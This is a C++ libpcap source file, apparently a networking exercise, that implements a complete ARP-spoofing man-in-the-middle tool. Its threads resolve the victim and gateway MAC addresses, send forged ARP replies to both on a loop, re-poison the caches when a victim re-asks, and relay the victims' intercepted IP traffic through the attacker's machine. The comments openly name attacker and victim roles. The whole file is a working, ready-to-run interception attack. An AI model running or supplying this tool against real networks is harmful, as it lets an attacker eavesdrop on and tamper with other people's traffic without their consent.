#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <stdlib.h>
#include <unistd.h>
#include <vector>
#include <pthread.h>
#include <string>
#include "my_info.h"
#include "iphdr.h"

#pragma pack(push, 1)
struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};
struct EthIpPacket {
	EthHdr eth_;
	IpHdr ip_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: send-arp-test wlan0 192.168.10.2 192.168.10.1\n");
}

char *uint_to_ip(uint32_t ip)
{
	struct in_addr ip_addr;
	ip_addr.s_addr = ip;
	return inet_ntoa(ip_addr);
}

char* my_ip;
char* my_mac;
int get_mac_addresses(pcap_t* handle, std::vector<char *> *pv_ip, std::vector<char *> *pv_mac);
void *arp_spoofing_reply(void* dev);
void *arp_spoofing_recover(void* dev);
void *arp_spoofing_relay(void* dev);
std::vector<char *> ip_senders; 		// victim
std::vector<char *> ip_targets; 		// gateway
std::vector<char *> mac_senders;
std::vector<char *> mac_targets;

int main(int argc, char* argv[]) {
	if (argc < 4 || argc % 2 == 1) {
		usage();
		return -1;
	}

	int cnt, res;
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	for(cnt = 2; cnt < argc; cnt += 2) {
		ip_senders.push_back(argv[cnt]);
		ip_targets.push_back(argv[cnt+1]);
	}

	my_ip = get_my_ip(dev);
	my_mac = get_my_mac(dev);
	if(my_mac == NULL) {
		fprintf(stderr, "couldn't get MAC address\n");
		return -1;
	}
	if(my_ip == NULL) {
		fprintf(stderr, "couldn't get IP address\n");
		return -1;
	}

	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	// 2. Find senders' MAC addresses
	if (get_mac_addresses(handle, &ip_senders, &mac_senders) == -1) {
		fprintf(stderr, "senders' mac address resolve failed\n");
		return -1;
	}

	// 3. Find targets' MAC addresses
	if (get_mac_addresses(handle, &ip_targets, &mac_targets) == -1) {
		fprintf(stderr, "senders' mac address resolve failed\n");
		return -1;
	}

	pcap_close(handle);

	// 4. run ARP functions
	pthread_t tid1, tid2, tid3;
	pthread_create(&tid1, NULL, arp_spoofing_reply, (void *)dev);
	pthread_create(&tid2, NULL, arp_spoofing_recover, (void *)dev);
	pthread_create(&tid3, NULL, arp_spoofing_relay, (void *)dev);
	pthread_join(tid1, (void **)&res);
	pthread_join(tid2, (void **)&res);
	pthread_join(tid3, (void **)&res);
}

int get_mac_addresses(pcap_t* handle, std::vector<char *> *pv_ip, std::vector<char *> *pv_mac)
{
	for (int i=0; i<pv_ip->size(); ++i) {
		char *tmp_mac_address = (char *)malloc(18);
		if (tmp_mac_address == NULL) {
			fprintf(stderr, "tmp_mac_address allocation error\n");
			return -1;
		}

		EthArpPacket packet;
		packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");	// sender's MAC
		packet.eth_.smac_ = Mac(my_mac);				// my MAC
		packet.eth_.type_ = htons(EthHdr::Arp);

		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		packet.arp_.pro_ = htons(EthHdr::Ip4);
		packet.arp_.hln_ = Mac::SIZE;
		packet.arp_.pln_ = Ip::SIZE;
		packet.arp_.op_ = htons(ArpHdr::Request);
		packet.arp_.smac_ = Mac(my_mac); 				// my MAC 
		packet.arp_.sip_ = htonl(Ip(my_ip));       		// my IP
		packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); 	// sender's MAC
		packet.arp_.tip_ = htonl(Ip((*pv_ip)[i])); 		// sender's IP
		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
			return -1;
		}

		while (true)
		{
			struct pcap_pkthdr* header;
			const u_char* p;
			int res = pcap_next_ex(handle, &header, &p);
			if (res == 0) continue;
			if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
				printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
				pcap_close(handle);
				return -1;
			}

			struct EthHdr *eth_hdr = (struct EthHdr *)p;
			if (ntohs(eth_hdr->type_) == EthHdr::Arp) {
				struct ArpHdr* arp_hdr = (struct ArpHdr *)(p + sizeof(struct EthHdr));
				if (Mac(my_mac) == arp_hdr->tmac_ && ntohs(arp_hdr->op_) == ArpHdr::Reply &&
				htonl((uint32_t)Ip(my_ip)) == (uint32_t)arp_hdr->tip_ && htonl((uint32_t)Ip((*pv_ip)[i])) == (uint32_t)arp_hdr->sip_) { 
					sprintf(tmp_mac_address, "%02x", ((uint8_t*)arp_hdr->smac_)[0]);
					for(int i=0; i<5; i++)
						sprintf((tmp_mac_address+2)+3*i, ":%02x", ((uint8_t*)arp_hdr->smac_)[i+1]);
					
					(*pv_mac).push_back(tmp_mac_address);
					printf("[*] mac[%d] : %s\n", i, (*pv_mac)[i]);
					break;
				}
			}
		}
	}
	return 1;
}

void *arp_spoofing_reply(void* dev) {
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live((const char *)dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return (void *)NULL;
	}

	while(1) {
		EthArpPacket packet;
		for (int i=0; i < ip_senders.size(); i++) {
			packet.eth_.dmac_ = Mac(mac_senders[i]);		// victim's MAC
			packet.eth_.smac_ = Mac(my_mac);				// attacker's MAC
			packet.eth_.type_ = htons(EthHdr::Arp);
			packet.arp_.hrd_ = htons(ArpHdr::ETHER);
			packet.arp_.pro_ = htons(EthHdr::Ip4);
			packet.arp_.hln_ = Mac::SIZE;
			packet.arp_.pln_ = Ip::SIZE;
			packet.arp_.op_ = htons(ArpHdr::Reply);

			packet.arp_.smac_ = Mac(my_mac); 				// attacker's MAC 
			packet.arp_.sip_ = htonl(Ip(ip_targets[i])); 	// gateway IP
			packet.arp_.tmac_ = Mac(mac_senders[i]); 		// victim's MAC
			packet.arp_.tip_ = htonl(Ip(ip_senders[i])); 	// victim's IP
			int res = pcap_sendpacket((pcap_t*)handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
			if (res != 0) {
				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr((pcap_t*)handle));
			}
		}

		for (int i=0; i < ip_targets.size(); i++) {
			packet.eth_.dmac_ = Mac(mac_targets[i]);		// victim's MAC
			packet.eth_.smac_ = Mac(my_mac);				// attacker's MAC
			packet.eth_.type_ = htons(EthHdr::Arp);
			packet.arp_.hrd_ = htons(ArpHdr::ETHER);
			packet.arp_.pro_ = htons(EthHdr::Ip4);
			packet.arp_.hln_ = Mac::SIZE;
			packet.arp_.pln_ = Ip::SIZE;
			packet.arp_.op_ = htons(ArpHdr::Reply);

			packet.arp_.smac_ = Mac(my_mac); 				// attacker's MAC 
			packet.arp_.sip_ = htonl(Ip(ip_senders[i])); 	// victim IP
			packet.arp_.tmac_ = Mac(mac_targets[i]); 		// target's MAC
			packet.arp_.tip_ = htonl(Ip(ip_targets[i])); 	// target's IP
			int res = pcap_sendpacket((pcap_t*)handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
			if (res != 0) {
				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr((pcap_t*)handle));
			}
		}
		sleep(5);
	}
	
}

void *arp_spoofing_recover(void* dev) {
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live((const char *)dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return (void *)NULL;
	}
	
	while (true) {
		struct pcap_pkthdr* header;
		const u_char* p;
		int res = pcap_next_ex(handle, &header, &p);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}

		struct EthHdr *eth_hdr = (struct EthHdr *)p;
		if (eth_hdr->type() == EthHdr::Arp) {
			for (int i=0; i<ip_senders.size(); ++i) {
				struct ArpHdr* arp_hdr = (struct ArpHdr *)(p + sizeof(struct EthHdr));
				if (ntohs(arp_hdr->op_) == ArpHdr::Request &&
					(uint32_t)Ip(ip_senders[i]) == ntohl((uint32_t)arp_hdr->sip_) &&
					Mac(mac_senders[i]) == arp_hdr->smac_ &&
					(uint32_t)Ip(ip_targets[i]) == ntohl((uint32_t)arp_hdr->tip_) &&
					Mac(my_mac) == arp_hdr->tmac_)
				{
					EthArpPacket packet;
					packet.eth_.dmac_ = Mac(mac_senders[i]);		// victim's MAC
					packet.eth_.smac_ = Mac(my_mac);				// attacker's MAC
					packet.eth_.type_ = htons(EthHdr::Arp);
					packet.arp_.hrd_ = htons(ArpHdr::ETHER);
					packet.arp_.pro_ = htons(EthHdr::Ip4);
					packet.arp_.hln_ = Mac::SIZE;
					packet.arp_.pln_ = Ip::SIZE;
					packet.arp_.op_ = htons(ArpHdr::Reply);

					packet.arp_.smac_ = Mac(my_mac); 				// attacker's MAC 
					packet.arp_.sip_ = htonl(Ip(ip_targets[i])); 	// gateway IP
					packet.arp_.tmac_ = Mac(mac_senders[i]); 		// victim's MAC
					packet.arp_.tip_ = htonl(Ip(ip_senders[i])); 	// victim's IP
					int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
					if (res != 0) {
						fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
						pcap_close(handle);
						return (void *)NULL;
					}
				}
			}
		}
	}
	
	pcap_close(handle);
	return (void *)NULL;
}

void *arp_spoofing_relay(void* dev) {
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live((const char *)dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return (void *)NULL;
	}

	while (true) {
		struct pcap_pkthdr* header;
		const u_char* p;
		int res = pcap_next_ex(handle, &header, &p);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			return (void *)NULL;
		}

		struct EthIpPacket *ethip_hdr = (struct EthIpPacket *)p;
		if (ethip_hdr->eth_.type() == EthHdr::Ip4) {
			// check the packet is for me
			if ((uint32_t)Ip(my_ip) == ntohl((uint32_t)ethip_hdr->ip_.ip_src))
				continue;

			for (int i=0; i<ip_senders.size(); ++i) {
				if ((uint32_t)Ip(ip_senders[i]) == ntohl((uint32_t)ethip_hdr->ip_.ip_src)) {
					// sender -> target (gateway)
					ethip_hdr->eth_.dmac_ = Mac(mac_targets[i]);
					ethip_hdr->eth_.smac_ = Mac(my_mac);
					int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(ethip_hdr), header->len);
					if (res != 0) {
						fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
						pcap_close(handle);
						return (void *)NULL;
					}
				}

				else if((uint32_t)Ip(ip_senders[i]) == ntohl((uint32_t)ethip_hdr->ip_.ip_dst)) {
					// target (gateway) -> sender
					ethip_hdr->eth_.dmac_ = Mac(mac_senders[i]);
					ethip_hdr->eth_.smac_ = Mac(my_mac);
					int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(ethip_hdr), header->len);
					if (res != 0) {
						fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
						pcap_close(handle);
						return (void *)NULL;
					}
				}
			}
		}
	}
	pcap_close(handle);
	return (void *)NULL;
}